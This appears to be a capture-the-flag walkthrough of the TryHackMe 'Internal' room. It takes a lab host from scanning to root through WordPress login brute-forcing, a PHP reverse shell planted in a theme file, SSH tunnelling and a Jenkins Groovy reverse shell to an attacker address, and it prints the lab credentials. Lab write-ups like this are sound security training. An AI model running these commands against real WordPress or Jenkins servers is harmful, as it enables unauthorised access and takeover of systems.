TryHackMe Internal Room — Complete Penetration Test Report
A documented end-to-end exploitation of the TryHackMe "Internal" room, covering reconnaissance through privilege escalation.

Overview 
-----------
This repository contains a complete walkthrough of a multi-stage internal network penetration test. The target exposes a WordPress installation vulnerable to credential enumeration and theme file manipulation, leading to remote code execution. Lateral movement via SSH tunneling and Jenkins exploitation results in root access.

Attack Chain: Nmap → Dirsearch → WPScan → RCE Shell → Lateral Movement (aubreanna) → SSH Tunnel → Jenkins Compromise → Root Access

 Quick Facts
-------------
- Target: Ubuntu 18.04 LTS (internal.thm)
- Exposed Services: SSH (OpenSSH 7.6p1), HTTP (Apache 2.4.29)
- Initial Entry: WordPress admin brute force via WPScan
- RCE Method: PHP reverse shell via theme editor
- Privilege Escalation: Jenkins script console (Groovy) running as root

 Exploitation Steps
-------------------
 ✹  Reconnaissance
```bash
nmap -sV -p- <target_ip>
# Result: SSH:22, HTTP:80
```

Add virtual host mapping to `/etc/hosts`:
```
<target_ip> internal.thm
```

✹  Web Enumeration
```bash
dirsearch -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
# Discovers: /wordpress/wp-login.php
```

✹ WordPress Credential Attack
```bash
wpscan --url http://internal.thm/wordpress --enumerate u
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
# Credentials: admin:my2boys
```

✹ Remote Code Execution
- Login to WordPress admin dashboard
- Navigate to **Appearance → Theme Editor
- Select TwentySixteen/Seventeen theme
- Edit `404.php` and inject PHP reverse shell
- Remove PHP extension guard (if present)
- Trigger shell by accessing non-existent page

Listener setup:
```bash
nc -lvnp 4444
```

✹ Lateral Movement (www-data → aubreanna)
Credentials found in `/opt/wp-save.txt`:
```
Username: aubreanna
Password: aubreanna (from wp-save.txt)
```

Stabilize shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su aubreanna
```

✹ User Flag: `/home/aubreanna/user.txt`

✹ Jenkins Discovery & Tunneling
Jenkins service runs internally on Docker subnet (172.17.0.2:8080), not directly accessible.

SSH port forwarding:
```bash
ssh -L 1234:172.17.0.2:8080 aubreanna@<target_ip>
# Access: http://127.0.0.1:1234
```

✹ Jenkins Exploitation
Brute force Jenkins login:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http://127.0.0.1:1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
# Credentials: admin:spongebob
```

✹ Root Access
Access **Manage Jenkins → Script Console** and execute Groovy reverse shell:
```groovy
String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"};
p = Runtime.getRuntime().exec(cmd);
```

Script console executes as root inside Jenkins container.

**Root Flag:** `/root/root.txt`

